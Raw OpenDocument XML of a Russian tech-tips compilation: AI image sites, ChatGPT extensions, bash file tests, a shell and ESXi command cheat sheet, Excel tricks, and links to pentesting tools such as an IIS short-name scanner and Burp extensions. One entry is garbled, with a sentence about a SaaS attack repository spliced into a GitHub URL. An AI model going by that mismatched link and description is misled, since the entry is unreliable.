text:style-name="T3"> делать ничего не нужно, </text:span><text:span text:style-name="T2">Samba</text:span><text:span text:style-name="T3">-сервера автоматически появятся в вашем сетевом окружении.</text:span></text:p>
      <text:p text:style-name="P1">Представляю первую часть подборки легендарных сервисов:</text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3">1. </text:span><text:span text:style-name="T2">https</text:span><text:span text:style-name="T3">://</text:span><text:span text:style-name="T2">www</text:span><text:span text:style-name="T3">.</text:span><text:span text:style-name="T2">unrealperson</text:span><text:span text:style-name="T3">.</text:span><text:span text:style-name="T2">com</text:span><text:span text:style-name="T3">/ - лица людей;</text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3">2. </text:span><text:span text:style-name="T2">https</text:span><text:span text:style-name="T3">://</text:span><text:span text:style-name="T2">www</text:span><text:span text:style-name="T3">.</text:span><text:span text:style-name="T2">thismodeldoesnotexist</text:span><text:span text:style-name="T3">.</text:span><text:span text:style-name="T2">co</text:span><text:span text:style-name="T3">/ - инстаграмные фото «модели»;</text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3">3. </text:span><text:span text:style-name="T2">https</text:span><text:span text:style-name="T3">://</text:span><text:span text:style-name="T2">thishottieisnotreal</text:span><text:span text:style-name="T3">.</text:span><text:span text:style-name="T2">com</text:span><text:span text:style-name="T3">/ - красивые женщины;</text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3">4. </text:span><text:span text:style-name="T2">https</text:span><text:span text:style-name="T3">://</text:span><text:span text:style-name="T2">www</text:span><text:span text:style-name="T3">.</text:span><text:span text:style-name="T2">thiswaifudoesnotexist</text:span><text:span text:style-name="T3">.</text:span><text:span text:style-name="T2">net</text:span><text:span text:style-name="T3">/ - аниме персонажи;</text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3">5. </text:span><text:span text:style-name="T2">https</text:span><text:span text:style-name="T3">://</text:span><text:span text:style-name="T2">www</text:span><text:span text:style-name="T3">.</text:span><text:span text:style-name="T2">thisautomobiledoesnotexist</text:span><text:span text:style-name="T3">.</text:span><text:span text:style-name="T2">com</text:span><text:span text:style-name="T3">/ - автомобили;</text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3">6. </text:span><text:span text:style-name="T2">https</text:span><text:span text:style-name="T3">://</text:span><text:span text:style-name="T2">thisfoodblogdoesnotexist</text:span><text:span text:style-name="T3">.</text:span><text:span text:style-name="T2">com</text:span><text:span text:style-name="T3">/ - крутые фото еды;</text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3">7. </text:span><text:span text:style-name="T2">https</text:span><text:span text:style-name="T3">://</text:span><text:span text:style-name="T2">www</text:span><text:span text:style-name="T3">.</text:span><text:span text:style-name="T2">thisgraffitidoesnotexist</text:span><text:span text:style-name="T3">.</text:span><text:span text:style-name="T2">com</text:span><text:span text:style-name="T3">/ - граффити;</text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3">8. </text:span><text:span text:style-name="T2">https</text:span><text:span text:style-name="T3">://</text:span><text:span text:style-name="T2">thisrentaldoesnotexist</text:span><text:span text:style-name="T3">.</text:span><text:span text:style-name="T2">com</text:span><text:span text:style-name="T3">/ - номера отелей;</text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3">9. </text:span><text:span text:style-name="T2">https</text:span><text:span text:style-name="T3">://</text:span><text:span text:style-name="T2">imgflip</text:span><text:span text:style-name="T3">.</text:span><text:span text:style-name="T2">com</text:span><text:span text:style-name="T3">/</text:span><text:span text:style-name="T2">ai</text:span><text:span text:style-name="T3">-</text:span><text:span text:style-name="T2">meme</text:span><text:span text:style-name="T3"> - мемы (неплохие!);</text:span></text:p>
      <text:p text:style-name="P19"><text:span text:style-name="T3">10. </text:span><text:span text:style-name="T2">https</text:span><text:span text:style-name="T3">://</text:span><text:span text:style-name="T2">thispersondoesnotexist</text:span><text:span text:style-name="T3">.</text:span><text:span text:style-name="T2">com</text:span><text:span text:style-name="T3">/ - лица людей.</text:span></text:p>
      <text:p text:style-name="P13">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2"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oft-page-break/><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21" loext:marker-style-name="T1"><text:span text:style-name="T2">$ ulimit -Hn</text:span></text:p>
      <text:p text:style-name="P14" loext:marker-style-name="T1"><text:span text:style-name="T3">Как проверить количество системных дескрипторов файлов в </text:span><text:span text:style-name="T2">Linux</text:span><text:span text:style-name="T3">:</text:span></text:p>
      <text:p text:style-name="P2"><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 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 </text:span><text:span text:style-name="T2">Sysctl</text:span><text:span text:style-name="T3">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span></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2"><text:span text:style-name="T3">С помощью указанной команды изменения, которые вы внесли, будут оставаться активными только до следующей перезагрузки. Если вы хотите </text:span><text:soft-page-break/><text:span text:style-name="T3">применить их на постоянной основе, вам придется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span text:style-name="T3">.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span></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sh. </text:span><text:span text:style-name="T3">Проверки</text:span><text:span text:style-name="T2"> </text:span><text:span text:style-name="T3">файлов</text:span><text:span text:style-name="T2">. K</text:span><text:span text:style-name="T3">оманды позволяют проверять различные условия, касающиеся файлов:</text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3">-</text:span><text:span text:style-name="T2">d</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">file</text:span><text:span text:style-name="T3"> # Проверяет, существует ли файл, и является ли он директорией.</text:span></text:p>
      <text:p text:style-name="P14"><text:span text:style-name="T3">-</text:span><text:span text:style-name="T2">e</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">file</text:span><text:span text:style-name="T3"> # Проверяет, существует ли файл.</text:span></text:p>
      <text:p text:style-name="P14"><text:span text:style-name="T3">-</text:span><text:span text:style-name="T2">f</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">file</text:span><text:span text:style-name="T3"> # Проверяет, существует ли файл, и является ли он файлом.</text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3">-</text:span><text:span text:style-name="T2">r</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">file</text:span><text:span text:style-name="T3"> # Проверяет, существует ли файл, и доступен ли он для чтения.</text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3">-</text:span><text:span text:style-name="T2">s</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">file</text:span><text:span text:style-name="T3"> # Проверяет, существует ли файл, и не является ли он пустым.</text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3">-</text:span><text:span text:style-name="T2">w</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">file</text:span><text:span text:style-name="T3"> # Проверяет, существует ли файл, и доступен ли он для записи.</text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3">-</text:span><text:span text:style-name="T2">x</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">file</text:span><text:span text:style-name="T3"> # Проверяет, существует ли файл, и является ли он исполняемым.</text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">file</text:span><text:span text:style-name="T3">1 -</text:span><text:span text:style-name="T2">nt</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">file</text:span><text:span text:style-name="T3">2 # Проверяет, новее ли </text:span><text:span text:style-name="T2">file</text:span><text:span text:style-name="T3">1, чем </text:span><text:span text:style-name="T2">file</text:span><text:span text:style-name="T3">2.</text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">file</text:span><text:span text:style-name="T3">1 -</text:span><text:span text:style-name="T2">ot</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">file</text:span><text:span text:style-name="T3">2 # Проверяет, старше ли </text:span><text:span text:style-name="T2">file</text:span><text:span text:style-name="T3">1, чем </text:span><text:span text:style-name="T2">file</text:span><text:span text:style-name="T3">2.</text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3">-</text:span><text:span text:style-name="T2">O</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">file</text:span><text:span text:style-name="T3"> # Проверяет, существует ли файл, и является ли его владельцем текущий пользователь.</text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3">-</text:span><text:span text:style-name="T2">G</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">file</text:span><text:span text:style-name="T3"> # Проверяет, существует ли файл, и соответствует ли его идентификатор группы идентификатору группы текущего пользователя.</text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3">#!/</text:span><text:span text:style-name="T2">bin</text:span><text:span text:style-name="T3">/</text:span><text:span text:style-name="T2">bash</text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:soft-page-break/><text:span text:style-name="T2">mydir</text:span><text:span text:style-name="T3">=/</text:span><text:span text:style-name="T2">home</text:span><text:span text:style-name="T3">/</text:span><text:span text:style-name="T2">likegeeks</text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">if</text:span><text:span text:style-name="T3"> [ -</text:span><text:span text:style-name="T2">d</text:span><text:span text:style-name="T3"> $</text:span><text:span text:style-name="T2">mydir</text:span><text:span text:style-name="T3"> ] <text:s text:c="19"/># если файл сущетсвует и он является директорией</text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">then</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">echo "The $mydir directory exists" # выводим сообщение</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">cd</text:span><text:span text:style-name="T3"> $</text:span><text:span text:style-name="T2">mydir</text:span><text:span text:style-name="T3"> <text:s text:c="25"/># переходим в него </text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">ls</text:span><text:span text:style-name="T3"> <text:s text:c="33"/># отображаем содержимое</text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">else <text:s text:c="31"/># ИНАЧЕ</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">echo "The $mydir directory does not exist"</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P3" loext:marker-style-name="T1"><text:span text:style-name="T2">fi</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3">Подборка </text:span><text:span text:style-name="T2">Chat</text:span><text:span text:style-name="T3">-</text:span><text:span text:style-name="T2">GPT</text:span><text:span text:style-name="T3"> расширений для браузера:</text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3">1. </text:span><text:span text:style-name="T2">DetectGP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detectgpt</text:span><text:span text:style-name="T3">-</text:span><text:span text:style-name="T2">detect</text:span><text:span text:style-name="T3">-</text:span><text:span text:style-name="T2">chat</text:span><text:span text:style-name="T3">-</text:span><text:span text:style-name="T2">gpt</text:span><text:span text:style-name="T3">/</text:span><text:span text:style-name="T2">oadkgbgppkhoaaoepjbcnjejmkknaobg</text:span><text:span text:style-name="T3">/</text:span><text:span text:style-name="T2">related</text:span><text:span text:style-name="T3">) - определяет текст, написанный нейросетью. (</text:span><text:span text:style-name="T2">Chrome</text:span><text:span text:style-name="T3">)</text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3">2. </text:span><text:span text:style-name="T2">CheatScrub</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">GPT</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">Detector</text:span><text:span text:style-name="T3"> (</text:span><text:span text:style-name="T2">https</text:span><text:span text:style-name="T3">://</text:span><text:span text:style-name="T2">addons</text:span><text:span text:style-name="T3">.</text:span><text:span text:style-name="T2">mozilla</text:span><text:span text:style-name="T3">.</text:span><text:span text:style-name="T2">org</text:span><text:span text:style-name="T3">/</text:span><text:span text:style-name="T2">en</text:span><text:span text:style-name="T3">-</text:span><text:span text:style-name="T2">US</text:span><text:span text:style-name="T3">/</text:span><text:span text:style-name="T2">firefox</text:span><text:span text:style-name="T3">/</text:span><text:span text:style-name="T2">addon</text:span><text:span text:style-name="T3">/</text:span><text:span text:style-name="T2">cheatscrub</text:span><text:span text:style-name="T3">/) - аналогичный аддон, но с более широким функционалом. (</text:span><text:span text:style-name="T2">Firefox</text:span><text:span text:style-name="T3">)</text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3">3. </text:span><text:span text:style-name="T2">ChatGPT</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">for</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">Search</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">Engines</text:span><text:span text:style-name="T3"> (</text:span><text:span text:style-name="T2">https</text:span><text:span text:style-name="T3">://</text:span><text:span text:style-name="T2">chatonai</text:span><text:span text:style-name="T3">.</text:span><text:span text:style-name="T2">org</text:span><text:span text:style-name="T3">/) - интеграция </text:span><text:span text:style-name="T2">ChatGPT</text:span><text:span text:style-name="T3"> в поисковую строку браузера. (</text:span><text:span text:style-name="T2">Chrome</text:span><text:span text:style-name="T3">, </text:span><text:span text:style-name="T2">Firefox</text:span><text:span text:style-name="T3">, </text:span><text:span text:style-name="T2">Edge</text:span><text:span text:style-name="T3">)</text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3">4. </text:span><text:span text:style-name="T2">Ghostwrite</text:span><text:span text:style-name="T3">: </text:span><text:span text:style-name="T2">ChatGPT</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">Email</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">Assistan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ghostwrite</text:span><text:span text:style-name="T3">-</text:span><text:span text:style-name="T2">chatgpt</text:span><text:span text:style-name="T3">-</text:span><text:span text:style-name="T2">email</text:span><text:span text:style-name="T3">/</text:span><text:span text:style-name="T2">fbjnnjochaopepfjpngghafgnafebkjh</text:span><text:span text:style-name="T3">) - умный почтовый помощник, пишущий письма. (С</text:span><text:span text:style-name="T2">hrome</text:span><text:span text:style-name="T3">)</text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3">5. </text:span><text:span text:style-name="T2">Casper</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">AI</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asper</text:span><text:span text:style-name="T3">-</text:span><text:span text:style-name="T2">ai</text:span><text:span text:style-name="T3">/</text:span><text:span text:style-name="T2">fgfiokgecpkambjildjleljjcihnocel</text:span><text:span text:style-name="T3">) - умный помощник для различных задач. Например, может сделать саммари из статьи. (</text:span><text:span text:style-name="T2">Chrome</text:span><text:span text:style-name="T3">)</text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3">6. </text:span><text:span text:style-name="T2">ChatGPT</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">Writer</text:span><text:span text:style-name="T3"> (</text:span><text:span text:style-name="T2">https</text:span><text:span text:style-name="T3">://</text:span><text:span text:style-name="T2">chatgptwriter</text:span><text:span text:style-name="T3">.</text:span><text:span text:style-name="T2">ai</text:span><text:span text:style-name="T3">/) - работает на всех страницах, исправляет ошибки, пишет тексты, саммари и т.д. (</text:span><text:span text:style-name="T2">Chrome</text:span><text:span text:style-name="T3">)</text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3">7. </text:span><text:span text:style-name="T2">GPT</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">for</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">Sheets</text:span><text:span text:style-name="T3"> (</text:span><text:span text:style-name="T2">https</text:span><text:span text:style-name="T3">://</text:span><text:span text:style-name="T2">workspace</text:span><text:span text:style-name="T3">.</text:span><text:span text:style-name="T2">google</text:span><text:span text:style-name="T3">.</text:span><text:span text:style-name="T2">com</text:span><text:span text:style-name="T3">/</text:span><text:span text:style-name="T2">marketplace</text:span><text:span text:style-name="T3">/</text:span><text:span text:style-name="T2">app</text:span><text:span text:style-name="T3">/</text:span><text:span text:style-name="T2">gpt</text:span><text:span text:style-name="T3">_</text:span><text:span text:style-name="T2">for</text:span><text:span text:style-name="T3">_</text:span><text:span text:style-name="T2">sheets</text:span><text:span text:style-name="T3">_</text:span><text:span text:style-name="T2">and</text:span><text:span text:style-name="T3">_</text:span><text:span text:style-name="T2">docs</text:span><text:span text:style-name="T3">/677318054654) - гугл-таблицы на стероидах. (</text:span><text:span text:style-name="T2">Chrome</text:span><text:span text:style-name="T3">)</text:span></text:p>
      <text:p text:style-name="P14"><text:span text:style-name="T3">8. </text:span><text:span text:style-name="T2">ChatGPT</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">for</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">YouTube</text:span><text:span text:style-name="T3"> (</text:span><text:span text:style-name="T2">https</text:span><text:span text:style-name="T3">://</text:span><text:span text:style-name="T2">chatgpt</text:span><text:span text:style-name="T3">4</text:span><text:span text:style-name="T2">youtube</text:span><text:span text:style-name="T3">.</text:span><text:span text:style-name="T2">com</text:span><text:span text:style-name="T3">/</text:span><text:span text:style-name="T2">ru</text:span><text:span text:style-name="T3">) - делает краткое содержание </text:span><text:span text:style-name="T2">YouTube</text:span><text:span text:style-name="T3"> роликов. (С</text:span><text:span text:style-name="T2">hrome</text:span><text:span text:style-name="T3">)</text:span></text:p>
      <text:p text:style-name="P14"><text:span text:style-name="T3">9. </text:span><text:span text:style-name="T2">ChatGPT</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">File</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">Uploader</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">Extended</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hatgpt</text:span><text:span text:style-name="T3">-</text:span><text:span text:style-name="T2">file</text:span><text:span text:style-name="T3">-</text:span><text:span text:style-name="T2">uploader</text:span><text:span text:style-name="T3">-</text:span><text:span text:style-name="T2">ext</text:span><text:span text:style-name="T3">/</text:span><text:span text:style-name="T2">becfinhbfclcgokjlobojlnldbfillpf</text:span><text:span text:style-name="T3">) - позволяет загружать файлы в </text:span><text:span text:style-name="T2">ChatGPT</text:span><text:span text:style-name="T3">. (</text:span><text:span text:style-name="T2">Chrome</text:span><text:span text:style-name="T3">)</text:span></text:p>
      <text:p text:style-name="P19"><text:span text:style-name="T3">10. </text:span><text:span text:style-name="T2">editGPT</text:span><text:span text:style-name="T3"> (</text:span><text:span text:style-name="T2">https</text:span><text:span text:style-name="T3">://</text:span><text:span text:style-name="T2">www</text:span><text:span text:style-name="T3">.</text:span><text:span text:style-name="T2">editgpt</text:span><text:span text:style-name="T3">.</text:span><text:span text:style-name="T2">app</text:span><text:span text:style-name="T3">/) - позволяет редактировать текст, выдаваемый нейросетью. (</text:span><text:span text:style-name="T2">Chrome</text:span><text:span text:style-name="T3">, </text:span><text:span text:style-name="T2">Firefox</text:span><text:span text:style-name="T3">, </text:span><text:span text:style-name="T2">Edge</text:span><text:span text:style-name="T3">)</text:span></text:p>
      <text:p text:style-name="P22">Шпаргалка по работе в командной строке. Команды для работы с файлами:</text:p>
      <text:p text:style-name="P1">ls - вывод содержимого каталога;</text:p>
      <text:p text:style-name="P1">ls -la - вывод содержимого каталога в форматированном виде (в т.ч. скрытые файлы);</text:p>
      <text:p text:style-name="P1">cd dir - перейти в каталог dir;</text:p>
      <text:p text:style-name="P1">cd - перейти в домашний каталог;</text:p>
      <text:p text:style-name="P1">pwd - показать текущий каталог;</text:p>
      <text:p text:style-name="P1">mkdir dir - создать каталог dir;</text:p>
      <text:p text:style-name="P1">rm file - удалить файл;</text:p>
      <text:p text:style-name="P1">rm -r dir - удалить каталог dir;</text:p>
      <text:p text:style-name="P1">rm -f file - принудительно удалить файл;</text:p>
      <text:p text:style-name="P1">rm -rf dir - принудительно удалить каталог dir;</text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">cp file1 file2 - </text:span><text:span text:style-name="T3">скопировать</text:span><text:span text:style-name="T2"> file1 </text:span><text:span text:style-name="T3">в</text:span><text:span text:style-name="T2"> file2;</text:span></text:p>
      <text:p text:style-name="P1">cp -r dir1 dir2 - скопировать каталог dir1 в каталог dir2 (если каталога dir2 нет, он будет создан);</text:p>
      <text:p text:style-name="P1">mv file1 file2 - переместить (или переименовать, если file1 и file2 находятся в одном каталоге) file1 в file2;</text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">ln -s file link - </text:span><text:span text:style-name="T3">создать</text:span><text:span text:style-name="T2"> </text:span><text:span text:style-name="T3">симлинк</text:span><text:span text:style-name="T2"> link </text:span><text:span text:style-name="T3">на</text:span><text:span text:style-name="T2"> </text:span><text:span text:style-name="T3">файл</text:span><text:span text:style-name="T2"> file;</text:span></text:p>
      <text:p text:style-name="P1">touch file - создать файл;</text:p>
      <text:p text:style-name="P1">cat &gt; file - направить стандартный ввод в file;</text:p>
      <text:p text:style-name="P1">more file - вывод содержимого file;</text:p>
      <text:p text:style-name="P1">head file - вывод содержимого первых 10 строк file;</text:p>
      <text:p text:style-name="P1">tail file - вывод содержимого последних 10 строк file;</text:p>
      <text:p text:style-name="P7">tail -f file - вывод содержимого file по мере появления, начиная с последних 10 строк файла.</text:p>
      <text:p text:style-name="P1">5 хаков в Microsoft Excel, которые ускорят работу. Для всех, кто перестал бояться таблиц и полюбил Excel, собрали самые удачные подсказки по работе в нем:</text:p>
      <text:p text:style-name="P1">- Как быстро поменять местами столбцы или строки?</text:p>
      <text:p text:style-name="P1">Выберите нужный столбец и переместите курсор на границу диапазона - он сменится на крестик. Зажмите левую кнопку мыши и потяните диапазон влево; по зеленой границе будет видно, куда переедет столбец или строка, если вы отпустите курсор.</text:p>
      <text:p text:style-name="P1">- Как не печатать запятые в десятичной дроби?</text:p>
      <text:p text:style-name="P1">Допустим, ваши значения в файле состоят исключительно из десятичных дробей. Откройте меню «Файл» - «Параметры» - «Дополнительно». Отметьте чекбокс «Автоматическая вставка десятичной запятой» и количество знаков после запятой. Excel будет автоматически отделять запятой последние N знаков.</text:p>
      <text:p text:style-name="P1">- Как легко растянуть колонки под размер содержимого?</text:p>
      <text:p text:style-name="P1">Выделите нужные ячейки, нажмите Alt, H, O, I.</text:p>
      <text:p text:style-name="P1">- Как разнести значения в одной ячейке по нескольким?</text:p>
      <text:p text:style-name="P17">Например, у вас есть таблица с ФИО визионеров, а вы хотите разнести фамилии, имена и отчества по разным колонкам. Берем первую ячейку - Илон Эрролович Маск - вносим «Илон» в соседнюю ячейку и нажимаем Ctrl+E. Все остальные значения окажутся в столбце.</text:p>
      <text:p text:style-name="P1">- Как сложить данные во всех строках (еще проще, чем вбить формулу в одну ячейку и растянуть на остальные)?</text:p>
      <text:p text:style-name="P7">Зажмите Ctrl, выделите все нужные ячейки, нажмите Alt =.</text:p>
      <text:p text:style-name="P1">Как найти количество открытых файлов в Linux. Значение сохраняется в</text:p>
      <text:p text:style-name="P1"># cat /proc/sys/fs/file-max</text:p>
      <text:p text:style-name="P1">Проверка Hard лимит в Linux</text:p>
      <text:p text:style-name="P1"># ulimit -Hn</text:p>
      <text:p text:style-name="P1">Проверка Soft лимит в Linux</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1"># su root</text:p>
      <text:p text:style-name="P1">$ ulimit -Sn</text:p>
      <text:p text:style-name="P4">$ ulimit -Hn</text:p>
      <text:p text:style-name="P1">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13"># sysctl -p</text:p>
      <text:p text:style-name="P13">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1">&lt;domain&gt;        &lt;type&gt;  &lt;item&gt;  &lt;value&gt;</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7">dimon soft nofile 1024</text:p>
      <text:p text:style-name="P1">Список полезных консольных команд VMWare ESXi (в том числе ESXCLI):</text:p>
      <text:p text:style-name="P1">reboot - перезагрузить хост</text:p>
      <text:p text:style-name="P1">poweroff - выключить хост</text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">esxcli system version get - </text:span><text:span text:style-name="T3">узнать</text:span><text:span text:style-name="T2"> </text:span><text:span text:style-name="T3">версию</text:span><text:span text:style-name="T2"> </text:span><text:span text:style-name="T3">(номер) инсталлированной версии VMware ESXi</text:span></text:p>
      <text:p text:style-name="P1">uname -a - так же узнать версию VMware ESXi</text:p>
      <text:p text:style-name="P1">vmware –vl - и еще один способ узнать версию и релиз VMware ESXi</text:p>
      <text:p text:style-name="P1">esxcli hardware pci list | more - полная информация об установленных PCI устройствах</text:p>
      <text:p text:style-name="P1">lspci - краткая информация обо всех установленных PCI устройствах</text:p>
      <text:p text:style-name="P1">esxtop - диспетчер процессов top для vmware esxi (быстрые клавиши для переключения дисплея: c :cpu, i :interrupt, m :memory, n :network, d :disk adapter, u :disk device, v :disk VM, p :power mgmt)</text:p>
      <text:p text:style-name="P1">vmkerrcode -l - расшифровка кодов ошибок</text:p>
      <text:p text:style-name="P1">esxcfg-nics -l - информация о сетевых картах</text:p>
      <text:p text:style-name="P1">esxcfg-vswitch -l - информация о виртуальных коммутаторах</text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">find . -name libstorelib.so - </text:span><text:span text:style-name="T3">найти</text:span><text:span text:style-name="T2"> </text:span><text:span text:style-name="T3">файл</text:span><text:span text:style-name="T2"> libstorelib.so</text:span></text:p>
      <text:p text:style-name="P1">dcui - работа с консолью сервера через ssh сессию</text:p>
      <text:p text:style-name="P1">chkconfig -l - статус работы демонов</text:p>
      <text:p text:style-name="P1">esxcli hardware memory get - размер установленной памяти</text:p>
      <text:p text:style-name="P1">esxcli software vib list - список установленных vib-пакетов</text:p>
      <text:p text:style-name="P1">esxcli network ip connection list - состояние активных соединений (аналог netstat)</text:p>
      <text:p text:style-name="P2"><text:soft-page-break/><text:span text:style-name="T3">esxcli storage vmfs extent list - информация о примонтированных/подключенных томах VMFS</text:span></text:p>
      <text:p text:style-name="P1">esxcli hardware clock (get/set) - отображение/установка времени esxi-хоста</text:p>
      <text:p text:style-name="P1">cd - Смена текущей директории;</text:p>
      <text:p text:style-name="P1">cp - Копирование файла.cp [файл 1] [файл2];</text:p>
      <text:p text:style-name="P1">find - Поиск файлов по критериям;</text:p>
      <text:p text:style-name="P13">ls - Список файлов и директорий в текущей или явно указанной директории.ls /vmfs/volumes/ ключи: -l подробная информация -a отображение скрытых файлов;</text:p>
      <text:p text:style-name="P13">mkdir - Создание директории;</text:p>
      <text:p text:style-name="P1">mv - Перемещение файла. Переименование файла.mv [путь и имя файла] [путь, куда перемещать];</text:p>
      <text:p text:style-name="P1">ps - Информация о запущенных процессах. ps -ef;</text:p>
      <text:p text:style-name="P1">rm - Удаление файлов;</text:p>
      <text:p text:style-name="P1">shutdown - Выключение или перезагрузка сервера shutdown nowshutdown –r now;</text:p>
      <text:p text:style-name="P1">vi - Текстовый редактор;</text:p>
      <text:p text:style-name="P1">nano - Дружелюбный к новичкам текстовый редактор, отсутствует на ESXi;</text:p>
      <text:p text:style-name="P1">cat - Вывод содержимого файла на экран. cat /etc/hosts;</text:p>
      <text:p text:style-name="P1">more - Вывод содержимого файла на экран, по странице за раз. more /etc/hosts;</text:p>
      <text:p text:style-name="P1">man - Справка по командам man &lt;команда, по которой есть вопрос&gt;, для некоторых команд помощь выводится при запуске самой команды без параметров;</text:p>
      <text:p text:style-name="P1">useradd - Создание пользователя. useradd &lt;имя пользователя&gt;;</text:p>
      <text:p text:style-name="P1">passwd - Задание пароля пользователю passwd &lt;имя пользователя&gt;;</text:p>
      <text:p text:style-name="P1">esxcli storage nfs list - список подключеных nfs- хранлилищ на хосте</text:p>
      <text:p text:style-name="P1">esxcli software vib list - cписок установленных vib-пакетов</text:p>
      <text:p text:style-name="P1">esxcli hardware memory get - информация об использовании памяти на хосте ESXi, включая общий объем</text:p>
      <text:p text:style-name="P1">Инструмент перечисления коротких имен файлов IIS:</text:p>
      <text:p text:style-name="P1">Shortscan предназначен для быстрого определения того, какие файлы с короткими именами существуют на веб-сервере IIS. Как только короткое имя файла будет определено, инструмент попытается автоматически определить полное имя файла. https://github.com/bitquark/shortscan</text:p>
      <text:p text:style-name="P1">Расширение Burp Suite запускайте действия и изменяйте форму HTTP-запроса/ответа и трафика WebSocket с помощью настраиваемых правил. https://github.com/synfron/ReshaperForBurp</text:p>
      <text:p text:style-name="P1">Расширение Burp Suite, которое предлагает набор инструментов для тестирования конечных точек GraphQL. https://githubЭтот репозиторий представляет собой набор методов атак, специфичных для SaaS. Он предназначен для исследователей безопасности, красно-синих команд и пентестеров, где они могут узнать о методах атак SaaS и поделиться ими.com/forcesunseen/graphquail</text:p>
      <text:p text:style-name="P3"><text:soft-page-break/><text:span text:style-name="T3">Сборник инструментов/сервисов для каждого компонента конвейера обнаружения и реагирования, а также примеры из реальной практики. Цель - создать справочный центр для разработки эффективных конвейеров обнаружения и реагирования на угрозы. https://github.com/0x4D31/detection-and-response-pipeline</text:span></text:p>
      <text:p text:style-name="P1">https://github.com/nvbn/thefuck - утилита, которая исправляет ошибки в предыдущих консольных командах. Примеры:</text:p>
      <text:p text:style-name="P1">➜ apt-get install vim</text:p>
      <text:p text:style-name="P1">E: Could not open lock file /var/lib/dpkg/lock - open (13: Permission denied)</text:p>
      <text:p text:style-name="P1">E: Unable to lock the administration directory (/var/lib/dpkg/), are you root?</text:p>
      <text:p text:style-name="P1">➜ fuck</text:p>
      <text:p text:style-name="P1">sudo apt-get install vim [enter/↑/↓/ctrl+c]</text:p>
      <text:p text:style-name="P1">[sudo] password for nvbn:</text:p>
      <text:p text:style-name="P1">Reading package lists... Done</text:p>
      <text:p text:style-name="P13">…</text:p>
      <text:p text:style-name="P13">➜ git push</text:p>
      <text:p text:style-name="P1">fatal: The current branch master has no upstream branch.</text:p>
